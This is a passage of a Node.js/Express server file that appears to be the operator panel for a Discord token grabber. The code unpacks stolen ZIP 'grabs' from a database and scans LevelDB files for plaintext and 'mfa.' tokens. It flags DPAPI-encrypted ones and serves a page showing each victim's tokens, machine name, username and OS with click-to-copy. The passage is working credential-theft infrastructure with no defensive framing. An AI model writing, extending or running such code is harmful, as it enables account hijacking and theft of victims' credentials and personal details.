    if (v10 >= 0 && v10 < 20) return { encrypted: true };
    // fallback: look for plaintext token (old Discord / unencrypted)
    for (let s = 0; s < 30; s++) {
      if (after[s] === 0x22) {
        const end = after.indexOf(0x22, s + 1);
        if (end > s + 15 && end < s + 200) {
          const val = after.slice(s + 1, end).toString("utf8");
          if (/^[A-Za-z0-9._+/:=-]{20,}$/.test(val)) return { token: val };
        }
      }
      // mfa. prefix (no quotes)
      if (after[s] === 0x6d && after[s+1] === 0x66 && after[s+2] === 0x61 && after[s+3] === 0x2e) {
        let end = s;
        while (end < after.length && /[A-Za-z0-9._-]/.test(String.fromCharCode(after[end]))) end++;
        if (end - s >= 25) return { token: after.slice(s, end).toString("ascii") };
      }
    }
  }
  return null;
}

function parseDiscordZip(zipBuf) {
  let zip;
  try { zip = new AdmZip(zipBuf); } catch { return []; }
  const entries = zip.getEntries();

  const meta = (() => {
    const me = entries.find(e => e.entryName === "m.json");
    if (!me) return {};
    try { return JSON.parse(me.getData().toString("utf8")); } catch { return {}; }
  })();

  const results = [];
  const seen = new Set();

  // First pass: read pre-decrypted tokens.json written by the grabber
  for (const e of entries) {
    const name = e.entryName;
    if (!name.endsWith("/tokens.json")) continue;
    const tag = name.split("/")[0];
    if (!tag.startsWith("dc") || seen.has(tag)) continue;
    try {
      const tokens = JSON.parse(e.getData().toString("utf8"));
      if (Array.isArray(tokens) && tokens.length > 0) {
        seen.add(tag);
        results.push({ source: tag, tokens, machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
      }
    } catch {}
  }

  // Second pass: fallback LDB scan for any tags not already found
  for (const e of entries) {
    const name = e.entryName;
    if (!name.includes("/ldb/")) continue;
    if (!/\.(ldb|log|sst)$/.test(name)) continue;
    const tag = name.split("/")[0];
    if (!tag.startsWith("dc") || seen.has(tag)) continue;
    const found = scanLDB(e.getData());
    if (found) {
      seen.add(tag);
      if (found.encrypted) {
        results.push({ source: tag, encrypted: true, machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
      } else {
        results.push({ source: tag, tokens: [found.token], machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
      }
    }
  }

  return results;
}

app.get("/dc/:id", checkKey, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT filedata, machine, username, os FROM grabs WHERE id = $1`, [req.params.id]
    );
    if (!rows.length) return res.status(404).send(page404());
    const results = parseDiscordZip(rows[0].filedata);
    const k = encodeURIComponent(req.query.key);

    // zip contents + deep debug
    let zipEntries = [];
    let deepDbg = {};
    try {
      const dbgZip = new AdmZip(rows[0].filedata);
      const dbgEntries = dbgZip.getEntries();
      zipEntries = dbgEntries.map(e => `${e.entryName} (${e.header.size}b)`);

      // check Local State for encrypted_key
      const lsE = dbgEntries.find(e => e.entryName.endsWith('/ls'));
      if (lsE) {
        const lsTxt = lsE.getData().toString('utf8');
        deepDbg.hasEncKey = lsTxt.includes('"encrypted_key"');
        deepDbg.lsLen = lsTxt.length;
        // try to extract key preview
        const km = lsTxt.indexOf('"encrypted_key":"');
        if (km >= 0) {
          const ks = km + 17, ke = lsTxt.indexOf('"', ks);
          deepDbg.encKeyB64Len = ke > ks ? ke - ks : 0;
        }
      }

      // count \x01token marker in each LDB + hex context
      const mk = Buffer.from([0x01,0x74,0x6f,0x6b,0x65,0x6e]);
      const mkV10 = Buffer.from('v10');
      deepDbg.tokenMarkers = {};
      deepDbg.hexCtx = [];
      for (const e of dbgEntries) {
        if (!/\.(ldb|log|sst)$/.test(e.entryName)) continue;
        const d = e.getData();
        let cnt = 0, v10cnt = 0, pos = 0;
        while (true) {
          const idx = d.indexOf(mk, pos); if (idx === -1) break;
          cnt++; pos = idx + 1;
          const after = d.slice(idx + mk.length, idx + mk.length + 80);
          if (after.indexOf(mkV10) >= 0) v10cnt++;
          // hex context: 8 bytes before + 80 after
          const ctxStart = Math.max(0, idx - 8);
          const ctx = d.slice(ctxStart, idx + mk.length + 80);
          deepDbg.hexCtx.push(`[${e.entryName.split('/').pop()} @${idx}] ${ctx.toString('hex')}`);
        }
        if (cnt > 0) deepDbg.tokenMarkers[e.entryName.split('/').pop()] = `x${cnt} (v10: ${v10cnt})`;
      }
    } catch(e) { zipEntries = ['zip parse error: ' + e.message]; }

    const cards = results.length ? results.map(r => {
      if (r.encrypted) return `
        <div class="tcard enc">
          <div class="tc-tag">${esc(r.source)} &mdash; ENCRYPTED</div>
          <div class="tc-label">STATUS</div>
          <div class="tc-val red">Token encrypted with DPAPI — decryption happens on-device (update grabber)</div>
          <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
        </div>`;
      const tokenRows = (r.tokens||[]).map(t => `
          <div class="tc-val mono selectable" onclick="cp(this)" title="click to copy">${esc(t)}</div>`).join("");
      return `
        <div class="tcard">
          <div class="tc-tag">${esc(r.source)} &mdash; ${(r.tokens||[]).length} token(s)</div>
          <div class="tc-label">TOKEN</div>
          ${tokenRows}
          <div class="tc-hint">click token to copy</div>
          <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
          <div class="tc-label">OS</div><div class="tc-val dim">${esc(r.os)}</div>
        </div>`;
    }).join("") : `<div class="empty"><div class="icon">&#9673;</div><p>no discord tokens found in this grab</p></div>
      <div class="tcard" style="margin-top:20px">
        <div class="tc-tag">ZIP CONTENTS (DEBUG)</div>
        ${zipEntries.map(e => `<div class="tc-val mono" style="font-size:10px;margin-bottom:2px">${esc(e)}</div>`).join('')}
        <div class="tc-label" style="margin-top:14px">DEEP SCAN</div>
        <div class="tc-val mono" style="font-size:10px">LocalState hasEncKey: ${deepDbg.hasEncKey} | len: ${deepDbg.lsLen} | b64len: ${deepDbg.encKeyB64Len}</div>
        <div class="tc-label" style="margin-top:8px">\\x01token HITS (+ v10 check)</div>
        ${Object.entries(deepDbg.tokenMarkers||{}).map(([f,c])=>`<div class="tc-val mono" style="font-size:10px">${esc(f)}: ${esc(c)}</div>`).join('') || '<div class="tc-val red" style="font-size:10px">NO \\x01token FOUND IN ANY LDB</div>'}
        <div class="tc-label" style="margin-top:8px">HEX CONTEXT (8 before + 80 after each hit)</div>
        ${(deepDbg.hexCtx||[]).map(h=>`<div class="tc-val mono" style="font-size:9px;word-break:break-all;margin-bottom:4px">${esc(h)}</div>`).join('') || '<div class="tc-val dim" style="font-size:10px">none</div>'}
      </div>`;

    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>tokens</title>
<style>
:root{--bg:#06060f;--card:#0c0c1e;--border:#14142e;--text:#8888aa;--dim:#44446a;--accent:#c084fc;--green:#4ade80;--red:#f87171;--mono:'Cascadia Code','Fira Code','Consolas',monospace}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px;min-height:100vh;padding:30px 24px}
a.back{color:var(--dim);text-decoration:none;font-size:11px;display:inline-block;margin-bottom:24px}
a.back:hover{color:var(--accent)}
h2{color:var(--accent);letter-spacing:3px;font-size:13px;margin-bottom:20px}
.tcard{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:22px 24px;margin-bottom:16px;position:relative}
.tcard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),transparent);border-radius:10px 10px 0 0}
.tcard.enc::before{background:linear-gradient(90deg,var(--red),transparent)}
.tc-tag{font-size:10px;color:var(--dim);letter-spacing:2px;margin-bottom:14px;text-transform:uppercase}
.tc-label{font-size:9px;color:var(--dim);text-transform:uppercase;letter-spacing:2px;margin-top:12px;margin-bottom:4px}
.tc-val{color:#eee;word-break:break-all;line-height:1.5}
.tc-val.mono{font-family:var(--mono);cursor:pointer}
.tc-val.small{font-size:10px}
.tc-val.red{color:var(--red)}
.tc-val.dim{color:var(--dim)}
.tc-hint{font-size:9px;color:var(--dim);margin-top:4px}
.selectable{user-select:all}
.empty{text-align:center;padding:60px 20px;color:var(--dim)}
.empty .icon{font-size:32px;margin-bottom:10px;opacity:.3}
.toast{position:fixed;bottom:24px;right:24px;background:var(--accent);color:#000;padding:10px 18px;border-radius:8px;font-size:12px;opacity:0;transition:opacity .3s;pointer-events:none}
.toast.show{opacity:1}
</style>
</head>
<body>
<a class="back" href="/?key=${k}">← back</a>
<h2>DISCORD TOKENS &mdash; ${esc(rows[0].machine || req.params.id)}</h2>
${cards}
<div class="toast" id="toast">copied</div>
<script>
function cp(el){
  const t=el.innerText;
  navigator.clipboard.writeText(t).then(()=>{
    const toast=document.getElementById('toast');
    toast.classList.add('show');
    setTimeout(()=>toast.classList.remove('show'),1500);
  });
}
</script>
</body>
</html>`);
  } catch (err) {
    res.status(500).send("error: " + err.message);
  }
});

app.listen(PORT, () => {
  console.log(`[+] running on ${PORT}`);
});
